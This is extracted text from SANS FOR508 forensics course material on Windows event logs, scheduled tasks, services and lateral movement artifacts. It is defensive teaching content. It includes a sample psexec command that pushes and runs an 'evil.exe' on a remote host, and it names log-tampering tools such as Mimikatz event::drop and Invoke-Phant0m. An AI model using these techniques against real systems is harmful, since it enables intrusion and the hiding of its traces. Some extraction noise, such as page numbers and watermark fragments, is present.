Task Scheduler/Operational log
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

93

.

In addition to event log entries, scheduled tasks create local configuration files. A new scheduled task format
(version 1.2) was implemented starting with Windows Vista and Server 2008. When a task is created, a file with
the same name as the task name is created in the %SystemRoot%\System32\Tasks folder (changed from the
original %SystemRoot%\Tasks folder in version 1.0 tasks). Tasks created using 32-bit code (rare and unusual so
worth looking for) will be saved in the %SystemRoot%\SysWOW64\Tasks folder. Task files have no extension
and are in XML format, making them easy to read without any special parsers. The new files also include more
information than in version 1.0 “.job” files. Some of the most pertinent information is:
•
•
•
•
•

When the task was registered
What account and system registered the task
Task trigger conditions and frequency (Once, daily, etc.)
Full command path
The account to be used to execute the scheduled command

The account information is particularly helpful when trying to identify remote scheduled tasks that are
commonly used for lateral movement. There are unfortunately few artifacts that identify a task as scheduled
remotely (even event logs do not differentiate between a local and remote scheduled task). However, by looking
at the Author tag under RegistrationInfo, we can identify the remote system name and account used to register
the task (no system name will show for locally scheduled tasks). Further, if a different account is used to run the
command, we will see that listed under the Principals/UserId tag.
In the slide, we have opened a job file named “YahooUpdateTask” in Notepad. The task was scheduled
remotely on the system from host M4500 (user NextGenHacker101) on 6/1/16 20:55:23 (local system time).
The command c:\windows\system32\srv1.exe was executed on 6/1/16 20:56:00 using the helpdesk account. In
order to schedule this task, the registrant must have successfully authenticated with the helpdesk account.
Assuming this task is malicious (and it is), the helpdesk account should also be considered to be compromised.
These files may be deleted by an attacker but can be forensically recovered. They can be especially useful to
track adversary activity through the enterprise (imagine a task scheduled on ten different systems—each system

© 2023 SANS Institute

.

93

would have a task file with the same filename). They also nicely augment the information discovered via
Security and Task Scheduler/Operational event logs.
An extremely useful PowerShell is available on GitHub to parse Task Scheduler XML files into CSV format. It
can be pointed at a single XML file, or the entire C:\Windows\System32\Tasks folder to parse them all. The
CSV output makes it easy to filter on relevant data to look for anomalies. You can find
ParseScheduledTasksXML.ps1 on GitHub.[1]
Previous Task Scheduler Format
The original Task Scheduler format, version 1.0, is used on XP/Win2003 systems and before. Like the newer
format, it uses a “Tasks” folder to store “.job” files. The Tasks folder is in the %SystemRoot% (Windows)
folder and in this version, data within the .job files is in a binary format. While this format does not hold as
much information as the newer v1.2 files, it provides the most important information: registration date/time, user
account, full command path, and execution date/time. Both At.exe and Schtasks.exe create .job files in this
format on XP/Win2003 systems. Additionally, on newer versions of the Windows OS, you may also see .job
files in this folder duplicating information held in the newer version 1.2 files. This is done for backward
compatibility and can be a nice find if an attacker is cleaning up and forgets to delete the files in both folders.
There is a handy utility on the SIFT Workstation to parse .job files found in the C:\Windows\Tasks directory.
The tool was written by Jamie Levy and is called “jobparser.py”. There is also a similar tool, written by Harlan
Carvey in Perl, called “jobparse.pl”, which provides the same information.

.

[1] GitHub vikas891 - General/ParseScheduledTasksXML: https://for508.com/yzw6o

94

© 2023 SANS Institute

.

.ir
01
de
hi
© 2023 SANS Institute

.

95

Suspicious Services

Scenario
• Analyze logs for suspicious services running at boot time
• Review services started or stopped during time of a suspected hack

Relevant Event IDs

•7034: Service crashed unexpectedly
• 7035: Service sent a Start/Stop control
• 7036: Service started or stopped
• 7040: Start type changed (Boot | On Request | Disabled)
• 7045: A new service was installed on the system (Win2008R2+)
• 4697: A new service was installed on the system (Security log)

Investigative Notes

• All Event IDs except 4697 reference the System log
• A large amount of malware and worms in the wild utilize Services
• Services started on boot illustrate persistence (desirable in malware)
• Services can crash due to attacks like process injection
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Windows Services control almost every element of the operating system. A service is a process that runs without
user interaction and regardless of whether a user is logged in.[1] They are a common target for malware and can
provide excellent clues as to malicious behavior on the system you are investigating. Events related to services
are located in the System log, and hence all Event IDs discussed in this section will be for System log events.

.

Services are governed by the Service Control Manager (SCM). It transmits control requests to running services
and drivers and maintains status information about those services. The SCM is responsible for updating the
System log with service-related events. When looking for suspicious services, five System log events are the
most useful:[2]
• 7034: Service crashed unexpectedly—services should crash only on rare occasions; thus, this is an
interesting anomaly that might be worth investigating. The event will also indicate how many times the
service has crashed previously. Sophisticated attacks like process/dll injection have been known to crash
services.
• 7035: Service sent a Start/Stop control—the SCM has ordered the service to either launch or shut down. A
7036 Event will indicate when this actually happens.
• 7036: Service started or stopped—indicates that the service is either fully operational or completely shut
down.
• 7040: Start type changed (Boot | On Request | Disabled)—reports on any changes to the Start Type of a
service. Services that are marked as Boot will start at boot time. Boot time starts are of particular interest
because they can be a vector for malware to survive a system reboot. On Request indicates that a process
must request the SCM to start the service and Disabled indicates that a service will not start even when sent a
control by the SCM. EID 7040 events are largely logged for Windows services and many not cover services
for third-party security tools, etc.

96

© 2023 SANS Institute

.

96

•

7045: Starting with Win2008R2, a new event has been added to track the first time a particular service was
installed on the system. This is an especially good event to start with when looking for suspicious services.
It has a high signal-to-noise ratio given that the frequent starts and stops of legitimate services don’t
overshadow the relatively rare malicious service information like they do with other event types. One
interesting note is that services that clean up after themselves—such as PsExec that deletes the service at
session end—will get a 7045 event each time they are installed as a service. Since this is an unusual event
in itself, it can help flag those abnormal services.

• 4697: This event is present within the Security log and only available if “Audit Security System Extension”
has been selected via local or group policy. Although similar to System log Event 7045, this event makes it
easy to correlate new Service activity with other Security log events (because they are all in the same log).
However, unlike System log Event 7045, it often does not record the actual user account that initiated the
service installation; instead, showing the system account that ultimately was used to bootstrap the service
(such as SYSTEM). Thus, it is worth correlating this log with entries in the System log to ensure no
information is lost. The EID 4697 event records service start type information similar to the Windows
Registry (0x00 = boot device, 0x01 = I/O subsystem, 0x02 = auto start, 0x03 = manual, 0x04 = disabled).
Corresponding event IDs in Windows XP/2003: 7034, 7035, 7036, 7040

.

[1] Understanding Windows Services Architecture: http://for508.com/0rabk
[2] Service Events Logging: http://for508.com/46ybz

© 2023 SANS Institute

.

97

Suspicious Services: PsExec
Metasploit PsExec Execution

“Normal” PsExec Execution

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

The PsExec tool provides an excellent example for using newly installed services to find interesting activity.
The Microsoft SysInternals version of the tool has a unique property of starting a brand-new service each time it
is executed. This unusual behavior makes identifying PsExec executions trivial since “new service installation”
events, EID 7045, are logged by default in the System log and EID 4697 can also be present in the Security log.
The example on this slide shows such a PsExec session. Recall that legitimate services are designed to run in
the background without user interaction. This leads to them largely being executed with built-in accounts like
SYSTEM or LOCAL SERVICE. Notice how the execution of PsExec here has made identification even easier
by starting services under the context of a user account (the SID S-1-5-21-572887454-18584997531978773125-1003 is indicative of a domain user account). This is rare and should always be looked at as you
will also sometimes find dangerous misconfigurations using high-valued accounts in addition to attacks. In this
example there were two PsExec executions on the system within about a five-hour period. We will cover
PsExec artifacts in more detail coming up, but the Service Name of “PSEXESVC” is a strong clue that someone
ran code remotely on this system. To find out who, we could resolve the associated user SID to an account
name (just search the Security log) or look for a corresponding EID 4624 logon event.
This slide also shows a different type of PsExec execution originating from the Metasploit attack framework.
Because PsExec has been around for so long, seemingly every attack framework has a tool to replicate it,
essentially performing remote code execution. While they might share the name, invariably they are
implemented differently. Interestingly, Metasploit still leverages a new Windows service to run code, but the
code is packaged as an encoded and obfuscated PowerShell script. This might help it evade some security
software, but it makes it look very suspect when discovered by an analyst. The example on this slide also
demonstrates a random Service Name, which is often a good marker for various Metasploit payloads (and many
other malware variants). The Impacket psexec.py tool generates a service name using four random characters,
which would look similarly unusual in the logs.
The big takeaway here is that looking for new services can help identify a wide range of attacks, from PsExec
variants to far more exotic malware. Services are widely used in malware in multiple attack cycle stages.
Everything from persistent backdoors (e.g., Cobalt Strike Beacon and Meterpreter) to credential dumpers (e.g.,
fgdump) to lateral movement tools (as seen on this slide) use Services to get code executed.
Corresponding event IDs in Windows XP/2003: 7035, 7036
98

© 2023 SANS Institute

.

98

.
© 2023 SANS Institute

.

99

Per-User Services

• Single session services created upon user logon
• Introduced in Windows 10 and Server products
• Each session generates a new service with unique ID
• Complicate “new service” detection, particularly EID 4697

01

.ir

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

hi

de

Services are commonly abused in Windows, and hence, the “new service installed” events in the Security log
(EID 4697) and System log (EID 7045) can be tremendous resources for finding evil. Up until Windows 10,
they had a high signal-to-noise ratio because there are not that many brand-new services introduced on the
average Windows system. This changed in Windows 10 with the introduction of “Per-User Services”. [1] As an
efficiency mechanism, Windows is now starting and stopping unique instances of services for each user logon.
These new services are named by adding a Locally Unique Identifier (LUID) to the end of the service name.
This LUID is often reused for all the per-user services created for that session. Unfortunately, this new breed of
service is regarded by the Security log as a never-before-seen service, generating multiple EID 4697 events
every time a user logs into the system.
This is a classic Microsoft decision making the life of a security analyst more difficult. By flooding our logs
with these “unique” service names, they are broadening the attack surface. One option might be to just filter out
any service name in our logs containing an underscore (“_”). This works but think like an attacker for a moment.
Wouldn’t it be brilliant to name your new malicious service as “OneSyncSvc_32d44dec” and blend in with the
hundreds of other previous services with similar names? A better option might be filtering by ServiceFileName;
perhaps creating an ignore list for items like “C:\Windows\system32\svchost.exe -k UnistackSvcGroup”. With
proper filtering this important event type can still be very useful. Perhaps the best option might be to focus on
the System log EID 7045 events instead. Currently, they do not appear to log these per-user services and as an
extra bonus, the System log typically includes a longer time range of activity.
[1] Per-user services in Windows 10 and Windows Server: https://for508.com/vl54e

100

© 2023 SANS Institute

.

100

Event Log Clearing (1)

Scenario
• Determine whether event logs have been modified

Relevant Event IDs
• 1102: Audit log cleared (Security log)
• 104: Audit log cleared (System log)

Investigative Notes
• Administrator rights are required to clear logs
• Clearing is all or nothing (but selective delete attacks exist)
• After Security log is cleared, a 1102 event is placed in log
• Any log clear except Security adds a 104 event in System log
• GUI and command-line clearing (i.e., wevtutil) are both recorded
• You should have alerts set up for these events!
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

101

.

One topic that invariably comes up when discussing event log review is that of log clearing. Local
Administrators, Domain Administrators, and the local SYSTEM account all have the privileges to clear event
logs. In many cases, we are investigating a user that has administrator rights (either legitimately or
illegitimately) and as such might have the capability of covering their tracks. Surprisingly, this does not happen
very often, which might be a consequence of the fact that it is difficult to clear event logs without a trace.
Whenever an administrator clears the Security log, an ID 1102 event is placed in the log to indicate that a clear
took place. Any other log that is cleared will be recorded as an ID 104 in the System log. Thus, even if we no
longer have access to the previous events, we at least know that a specific user account cleared the logs. This
can be evidentiary in itself, particularly when working a hacking case or when data spoliation is of interest. By
reviewing 1102 and 104 entries, we can see when the logs were last cleared and ensure they match with known
legitimate administrator activities and are in line with data retention and security policies.
It is common tradecraft during ransomware attacks to see a lot of cleared event logs. Thus, this is a high-fidelity
alert you should be closely monitoring in your environment.
Corresponding event IDs in Windows XP/2003: 517

© 2023 SANS Institute

.

101

Event Log Clearing (2)
1. Security log was
cleared
2. All events deleted and
ID 1102 Event added
to log
3. Event description
shows user account
that cleared log: root

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

When an event log has been cleared, the first event in the log chronologically will be an ID 1102 System Event
indicating that the log was cleared. This, of course, assumes that the system has the correct auditing policy in
place to audit successful system events. Taking a look at the ID 1102 Event Properties, we see that we have
confirmation that the Security event log was cleared, and we have a date and time of when it occurred. Within
the description section, the account name will be displayed, indicating the user account that exercised its
privileges to clear the log along with a logon ID for the session. In this example, an account named root cleared
the Security log. The event is the same regardless of the mechanism used to clear the logs (PowerShell ClearEventLog, wevtutil cl, clear via Event Viewer, etc.) Administrator privileges are required to clear logs in
Windows.

102

© 2023 SANS Institute

.

102

.ir
01
de
hi
© 2023 SANS Institute

.

103

Event Log Attacks

• New attacks have shown selective deletes possible
• Mimikatz event::drop
• DanderSpritz eventlogedit
• Invoke-Phant0m thread killing
• Event log service suspension; memory-based attacks

• Arbitrary events can be removed, including EID 1102
• Mitigation:
• Event log forwarding
• Logging “heartbeat”
• Log gap analysis

01

.ir

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

hi

de

Like many sacred cows in the Windows security world, event logging has recently been under a sustained
attack. Logs are locked and protected files and highly intolerant of corruption. The security log is only writable
by the Local Security Authority Subsystem Service (LSASS) and there are no Windows API functions that can
interact with events. Log clearing in Windows was built to be all or nothing. Individual records should not be
able to be selectively removed. However, there has been proof of concept code released of hacking tools capable
of selectively deleting events within a live log all the way back to WinNT/2000. “WinZapper”, the original
event log editing tool, never worked well and was just as likely to crash the event log service or render the logs
corrupted than it was to be successful.[1]
While always theoretically possible, it wasn’t until fairly recently that event log editing tools were discovered in
the wild. The Shadow Brokers leak gave the world access to the DanderSpritz, a highly functional implant that
includes a clever tool named “eventlogedit”. The eventlogedit functionality removes entries from the logs by
changing event headers to jump over targeted events.[2] Interestingly, the event stays resident in the logs and can
be recovered with forensics (Eric Zimmerman’s EvtxECmd tool will automatically detect this attack during
event parsing). Benjamin Delpy added event log functionality to the Mimikatz tool, allowing it to patch the
Event Log Service and stop recording entries in the Security log. Interestingly, this capability can be used to
clear the entire log without adding an event ID 1102 event. However, the tool does not yet have a way to turn
event logging back on, leading to obvious gaps in the logs. The PowerShell tool Invoke-Phant0m seeks out
process running the event log service and kills all running threads.[3] Amazingly, the service still appears to be
running, but no longer logs events. Other research has shown the ability to suspend the Event Log Service,
modify logs, and then restore the service. Researchers have also started looking into targeting the memorymapped segments of the event logs, making changes directly in RAM. All these attacks require administrative
rights. We have even witnessed a sophisticated adversary attempting to fill the logs with noise rather than
clearing! Needless to say, you should approach event log analysis with some caution. However, also note that a
vast subset of attackers will never bother to worry about cleaning event logs.
Going forward, the threat of event log manipulation should hopefully push more enterprises to a log forwarding
and centralized storage model. This will mitigate attacks like DanderSpritz, but not attacks that stop logging
altogether. For that class of attacks, we may need more sophisticated analytics that can identify systems that
have not forwarded logs over a period of time or that have unusual gaps in their logging.
104

© 2023 SANS Institute

.

104

.

[1] Winzapper: Wikipedia: http://for508.com/pge69
[2] DanderSpritz: Fox-IT: http://for508.com/1-id5
[3] Invoke-Phant0m: https://for508.com/ecdrf

© 2023 SANS Institute

.

105

EvtxECmd

• Command line event log parser
• Xpath filters used for extraction
• Output in CSV, XML, JSON
• One log or entire directory
• Live or exported logs

• Benefits:

• Easy extraction of “custom” fields
• Disparate log merging and normalization
• Crowd-sourced event maps (filters)
• Noise reduction
• Extract from VSS and de-duplicate
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

EvtxECmd was written by Eric Zimmerman and provides an incredibly useful set of capabilities to analyze
Windows event logs. [1] At first glance, it appears to be a command-line based parser to convert logs from their
native format to CSV, XML, or JSON. However, its real power lies in the ability to filter and extract custom
information from specific event types.

.

One of the biggest challenges with the Windows event log format is much of the information in an event is
customized for each event type. This makes it very hard to normalize and filter logs en masse. EvtxECmd
tackles this problem by hosting a set of crowd-sourced event map files for each event log and event type of
interest.[2] These map files use Xpath filters to extract only the critical information, greatly simplifying filtering
and grouping of data. As an example, let’s assume the EvtxECmd project has thirty map files for the
Security.evtx log. When that log is parsed by the tool, those thirty event types will be extracted and important
values from each event type will be extracted and assigned to columns in the CSV output (username, domain, IP
address, etc.) The pre-filtered and normalized output can now be analyzed and further filtered by the examiner.
Further extrapolate that idea to a hundred Security.evtx logs collected from a hundred different systems—or a
hundred different types of logs on a single system. EvtxECmd demonstrates its true value by allowing easy
filtering, normalization, and merging of logs at scale. It can be run on live systems or collections of logs from
mounted disk images or triage data. When run on a live system, it has the capability to access the Volume
Shadow Service (VSS) to retrieve older versions of event logs and de-duplicate its findings.
[1] Eric Zimmerman Tools: https://for508.com/8t6pb
[2] EvtxECmd Map Files: https://for508.com/xkr90

106

© 2023 SANS Institute

.

106

EvtxECmd Maps

107

01

.ir

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

hi

de

EvtxECmd takes advantage of the fact that modern event logs are in XML format. As such, they lend
themselves to easy Xpath filtering. Xpath allows us to identify specific parts of XML output. In this case, each
event type to parse is represented as a file, called a “Map”. The Map contains the values of the event type to
extract using Xpath filter notation. Those extracted values can then be formatted and combined into output
columns.
The example on this slide shows an EvtxECmd Map file for EID 4624 on the left, and a corresponding EID
4624 event log entry shown in native XML format. Arrows denote how individual elements are referenced for
the “TargetDomainName” value. Notice that the final “PayloadData1” column (property) will be a combination
of both TargetDomainName and TargetUserName.
The standardized fields that are available for use in maps include:
UserName: User and/or domain info as found in various event IDs
RemoteHost: IP address and/or host name (or both!) information found in event IDs
ExecutableInfo: Used for things like process command line, scheduled task, info from service install, etc.
PayloadData1-6: Six fields to put whatever you see fit into
Note: The columns “PayloadData1-6” are generic by design. Since there are so many different types of events
and so many different values that can be extracted, providing unique columns to every variant would lead to
hundreds of columns in the output file. To prevent this, the tool author chose to allow each event type to reuse
columns for up to six elements of interest. What this means, in practice, is that in an output file with multiple
different Event IDs, there will be disparate data in the “PayloadData1-6” columns. The analyst will be required
to interpret what this data is by referencing the Event ID and the underlying Map files when necessary.

© 2023 SANS Institute

.

107

.
108

© 2023 SANS Institute

.

Grouping and Filtering EvtxECmd Results

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

109

.

Much of the power provided by EvtxECmd relates to the opportunities for creative filtering of the results. When
paired with a tool like Timeline Explorer (as seen on this slide), events can be quickly reduced by the analyst.
Individual columns can be used for filtering, such as the EventID column, when looking for specific event types.
Keyword filtering can be used to identify executable names, user accounts, or any unique string. The
EvtxECmd output also lends itself to the “Group by Column” feature of Timeline Explorer. This feature is
similar to pivot tables in Excel and provides an easy means to group items according to values present in a
column. On this slide, we see that first a grouping was accomplished using the “Event Id” column. This
organizes the data into groups by Event ID, allowing the analyst to drill into any that are interesting. A count of
each type is also provided, useful for identifying rare events. Grouped columns can be further segmented by
chaining (grouping) additional columns together. The final example on this slide shows a triple grouping by
Event ID, Username, and LogonType (this required the analyst to identify “Payload Data1” as username data
and “Payload Data2” as LogonType). We can quickly see information like the user “tdungan” has only two
LogonType 10 (RDP) logons. If those are interesting, that grouping can be opened to view the two matching
entries for time and date and IP address information. Clearly this is a powerful way to filter event log data for
analysis!

© 2023 SANS Institute

.

109

.
110

© 2023 SANS Institute

.

Intrusion Analysis Agenda

Advanced Evidence of Execution
Event Log Analysis for Responders and Hunters
Lateral Movement Adversary Tactics
Command Line, PowerShell, and WMI Analysis
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

111

.

This page intentionally left blank.

© 2023 SANS Institute

.

111

Lateral Movement
Adversary Tactics
An Overview of the
Hunt Evil Poster

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

112

© 2023 SANS Institute

.

112

Lateral Movement Overview: Copy Malware
Credential Harvesting and Account Creation

Gain
Authority

Remote Desktop Services
Windows Admin Shares

Copy
Malware

PsExec
Windows Remote Management Tools

Execute
Malware/
Commands

PowerShell Remoting/WMIC
Vulnerability Exploitation and Application Deployment Software
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

113

.

Once some authority has been gained, moving files and malware around from system to system is essential for
many advanced threats. While not every lateral movement technique needs to copy malware or files from
system to system, it is essential if you want to use specific capabilities not existing on the remote system by
default.

© 2023 SANS Institute

.

113

Remote Desktop Services: Source System Artifacts

If admins use remote desktop, expect attacker usage
• Most commonly Microsoft Remote Desktop (RDP)
• Also look for VNC, TeamViewer, etc. (if available in network)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

When tracking lateral movement, one maxim to remember is that eventually attackers will start to move around
in the same manner as your administrators. Your network has been specifically architected to allow certain types
of remote administration (and disallow others). Once attackers achieve admin and domain admin credentials,
they will very quickly learn how best to use them to move around the network. Thus, if you have remote desktop
capabilities enabled, it is very likely you will see your adversaries taking advantage.
RDP is the most common remote desktop protocol in Windows networks and thankfully maintains good
logging. However, the best logs are unfortunately located on the destination (or target) machine. This is why the
Microsoft-Windows-TerminalServices-RDPClient/Operational log is such an important
data source—it is one of the easiest places to find where an attacker has moved to from the source system
(without needing to go to each possible target system to review logs). In general, look for anomalies like remote
desktop connections to workstations or RDP activity to servers outside of normal administration time frames.
On the source system, the RDP client may record recent connections in the following registry key:
NTUSER\Software\Microsoft\Terminal Server Client\Servers. The RegRipper plugin “rdphint” parses this key.
Jump list data for remote desktop applications can also provide references to remotely connected systems (the
RDP client Jump List is recorded using the mstsc.exe executable). The presence of the file Default.rdp in a
user’s profile is a good indication that RDP has been executed on that system (the creation and modification
times of this file can also provide pivot points). Execution artifacts can show when and how many times
terminal services (mstsc.exe) was executed (per user). There have been some great cases solved based on
fragments reassembled from the RDP Bitmap Cache files on the source system. An open-source tool named
bmc-tools.py can help you parse the bitmap cache files.[1]
While there are too many remote screen sharing applications to list, not all are used in an enterprise
environment. Depending on how the application is implemented, it may or may not record logon authentications
in the Windows event logs. As an example, VNC will often record a 4624 successful logon on the target system,
but it will be recorded as a Type 2 (Console) logon. Most popular VNC applications (Ultra VNC, Tight VNC,
Real VNC) have application-specific logs that record activity on the source system. These can include
connections made to the remote system. Application-specific registry keys may also record the most recently
connected systems and prove the application was installed on the system.
114

© 2023 SANS Institute

.

114

TeamViewer is another popular remote desktop service that records data on both the source and target systems.
On the originating source system, look for the TeamViewerX_Logfile.log in the C:\Program
Files\TeamViewer\VersionX folder (replace X with the TeamViewer version). On the target, TeamViewer
records connections in a log named Connections_incoming.txt.
On some occasions, attackers may install their own remote desktop solution for lateral movement. In these
situations, evidence of application installation in the event logs, registry, and file system can all point to
nefarious activity.
Note that it is possible to block the use of RDP in your environment for sensitive account like domain
administrator and service accounts. The Active Directory setting “Deny log on through Remote Desktop
Services” can be easily set on high valued accounts. At the host level, the RDP service can be disabled, and the
Windows firewall can be set to deny inbound RDP connections in parts of the networks where RDP is not
required.

hi

de

01

.ir

[1] RDP Bitmap Cache parser: http://for508.com/xp-gf

© 2023 SANS Institute

.

115

Remote Desktop Services: Destination System Artifacts

Different artifacts on Source and Destination!
• Notice wealth of registry and file system info on Source
• Destination has more robust event log artifacts
* Event logs and IDs will be covered in more depth in next section

01

.ir

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

hi

de

When investigating lateral movement, we need to understand where our evidence will be recorded. The
destination, or target, system will log activity largely via Windows Event Logs. While you may identify registry,
filesystem, and memory artifacts related to helper file execution (such as rdpclip.exe which facilitates clipboard
sharing between sessions), we will be largely relying upon the excellent logging Windows provides. This is one
reason centralizing logs is so important. Once a malicious pattern is identified, it can be quickly searched across
all endpoints if the logs are all in one place.
RDP connections record as event log ID 4624 Type 10 (Remote Interactive) logons. These are fairly unusual
and can be a great way to easily detect RDP activity. RDP sessions will also record ID 4778 and 4779 RDPspecific events. Look for anomalies like remote desktop connections to workstations or RDP activity to servers
outside of normal administration time frames.
In addition to event log reporting in the Security log, the latest versions of Windows have included a wealth
of RDP-specific logs that can help fill out our understanding. Microsoft-WindowsRemoteDesktopServices-RDPCoreTS/Operational, Microsoft-WindowsTerminalServices-RemoteConnectionManager/Operational, and Microsoft-WindowsTerminalServices-LocalSessionManager/Operational all provide records of activity on the
destination system. As an added bonus, these specialized logs are enabled by default and do not roll over nearly
as frequently as the Security event log.

116

© 2023 SANS Institute

.

116

Windows Admin Shares: Source System Artifacts

Mounting built-in shares is a simple and effective means of
lateral movement: C$ • ADMIN$ • IPC$

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

117

.

Windows administrative shares are default shared resources designed to allow administrative programs access to
the entire file system. They are present on every modern version of Windows (though hidden) and are almost
always enabled. The most interesting of these shares from a lateral movement perspective are the drive volume
shares (e.g., C$), the Admin$ share giving access to the Windows folder, and the IPC$ share commonly used by
named pipes.
We have multiple ways to detect lateral movement via administrative shares on the source system. Event
logging on the source system is sparse but may be available in situations where alternate credentials were used
or where failures occurred. The Windows built-in “net” commands are the most commonly used tool for
mapping shares, so program execution artifacts can be useful. If command line auditing is enabled, look for
typed commands like “net use”.
A very important artifact on the source system is the Windows registry key
NTUSER\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2. This is especially helpful
since it can show the entire list of systems connected to by a user account (NTUSER is tied directly to a specific
user account). This information can be future enriched via the Windows Shellbags keys, showing what folders
were accessed (but only for interactive sessions). To get this information from destination systems, defenders
would have to piece together the list by reviewing the event logs of each of the target systems (event logs
typically only record information at the destination of an action, not the source). In the example shown here, we
see a user’s MountPoints2 key indicating admin shares were accessed on at least two different remote systems
(10.3.58.4 and 10.3.58.5).

© 2023 SANS Institute

.

117

Windows Admin Shares: Destination System Artifacts

• Easy way to stage malware or access sensitive files
• Pass-the-hash attacks are common
• Vista+ requires domain admin or built-in admin rights

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Attackers can access Admin shares to upload tools into nearly any folder. Drive volume shares give complete
access to the entire volume, making them a quick way to remotely pillage sensitive files. Since SMB has
significant flaws that allow NTLM relay attacks and few environments have adequately hardened SMB with
new upgrades like SMB signing, pass-the-hash attacks are very commonly used with this attack vector. Luckily,
modern versions of Windows (Vista and above) now require domain admin privileges or the built-in admin
account (RID 500) for remote access to admin shares.[1] This mitigates much of the threat from local admin
account abuse we saw in Windows XP. Shares are also a common vector for malware to laterally move—
Conficker, Shamoon, Wannacry, NotPetya, and North Korean malware in the Sony Pictures attack all searched
for or created new shares to propagate.
We have multiple ways to detect lateral movement via administrative shares. Destination systems can have
excellent logging available (depending on the audit policy)—start your search for event ID 4624 Type 3
(Network) logons and corresponding ID 5140 share access events. File system timelines can identify files copied
during the times of share use.
If you have network monitoring available, SMB is a well-known protocol and is not encrypted in most
enterprises, so network forensics can do an excellent job of rebuilding SMB sessions.
[1] Description of User Account Control and remote restrictions in Windows Vista: http://for508.com/kr015

118

© 2023 SANS Institute

.

118

Lateral Movement Overview: Execute Malware / Commands
Credential Harvesting and Account Creation

Gain
Authority

Remote Desktop Services
Windows Admin Shares
Copy

PsExec

Malware

Windows Remote Management Tools
Execute
Malware/
Commands

PowerShell Remoting/WMIC
Vulnerability Exploitation and Application Deployment Software
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

119

.

Executing code or remote commands on another system allows the advanced threat to freely move and
manipulate the enterprise. There are multiple native ways for advanced threats to be able to execute code across
the environments they are targeting. The following slides detail the most often seen techniques that nearly all
adversary groups are using in one form or another as they progress through your network.

© 2023 SANS Institute

.

119

PsExec: Source System Artifacts

• Lightweight, remote execution tool provided by Microsoft
• PsExec is not a default application

• Often used for both legitimate and nefarious deeds (on
same network)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

PsExec was designed by Microsoft Sysinternals to be a lightweight tool for remote administration operations. It
can push and execute code non-interactively, make built-in system commands “remote-capable” by sending data
back to the originating system, and even be used for interactive console sessions (i.e., running a cmd.exe shell
on the remote system). It is the latter functionality that significantly increases the tool’s forensic footprint,
requiring it to be run as a Windows service and creating named pipes as communication channels. A sample
command might look like the following.
psexec.exe \\host –u user -accepteula –d -c c:\temp\evil.exe (-d does not wait for
process termination; -c copies binary to remote system)
Without a doubt, PsExec is used as frequently for legitimate administrative tasks (like pushing hotfixes) as for
nefarious ones. The challenge to the incident responder is sifting through the artifacts to find the malicious uses.
Given its popularity, we are lucky it produces so many forensic artifacts.
If PsExec is not common in the environment, application execution artifacts are easy wins for identifying its
usage. Prefetch, ShimCache, BAM/DAM, and Amcache all record its execution. Look for PSEXEC.EXE on the
source system. One of the wonderful aspects of the Sysinternals suite is their requirement to accept the user
agreement (Eula). This makes them particularly obvious (what malware have you seen that requires Eula
acceptance?). The first time the PsExec Eula is accepted on the source system, the following registry key is
created, NTUSER\Software\SysInternals\PsExec\EulaAccepted. This key is not deleted, and the registry last
write time indicates one time the tool was executed by that user.
PsExec can result in significant event log activity, but most of it is largely on the destination system. One
exception is if explicit credentials are used, an EID 4648, “runas” event will be created on the source system. As
more enterprises enable command line auditing with their Process Tracking events, the full command line of
whatever PsExec was asked to do will be available to responders on the source system.
A final place to discover PsExec activity is via running processes and memory analysis. Similar to the
application execution artifacts, investigators should look for PSEXEC.EXE processes. In some cases, attackers
may rename PsExec to better blend in.
120

© 2023 SANS Institute

.

120

PsExec: Destination System Artifacts
✓ Authenticates to destination system
✓ Named pipes are used to communicate between source and target
✓ Mounts hidden ADMIN$ share
✓ Copies PsExeSvc.exe and any other binaries to Windows folder
✓ Executes code via a service (PSEXESVC)
psexec.exe

psexesvc.exe

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

121

.

PsExec requires multiple steps to remotely execute commands. First, it must authenticate to the destination
system. Named pipes are then set up between the source and destination. The ADMIN$ share is mounted on the
destination, and PsExeSvc.exe and any other binaries are copied to the Windows folder (by default). Finally, a
Windows service is started, and the files copied are executed. With all this activity occurring in the background,
PsExec can result in significant event log activity on the destination system. Authentication takes place under
the current user context by default and results in an ID 4624 Type 3 (Network) logon event. If the attacker
changes the account context (with the -u option), the authentication event is an ID 4624 Type 2 (Console) logon
for that new account. The latter instance will also result in a user profile being created if the -e argument is not
provided. Note that a Type 2 Console logon is considered “interactive” by Windows and causes the account
token to be available, a problem for legitimate use of this tool. Since PsExec mounts the ADMIN$ share, we
may also get an ID 5140 share access event. As if that weren’t enough, the creation, starting, and stopping of the
PSEXESVC service also writes several events to the System event log, including ID 7045 events.
Due to its implementation, PsExec necessarily copies itself to the destination \Windows folder (named
PSEXESVC.EXE). If a binary is executed that does not currently exist on the target, the –c argument tells
PsExec to copy it to the system. Both instances provide an opportunity for the forensic analyst to identify and
recover those files along with their corresponding creation timestamps. If you find an executable or batch file
created very close to the execution of PSEXESVC.EXE, the two are very likely related. Keep in mind that
PsExec –c can copy a binary anywhere in the file system, and unless the command line was captured, it may
take additional artifacts to determine what was executed.
The destination system will also record application execution events for the PSEXESVC.EXE application (Pro
tip: The name of the file is different on the source (psexec.exe) than on the destination (psexesvc.exe). Also note
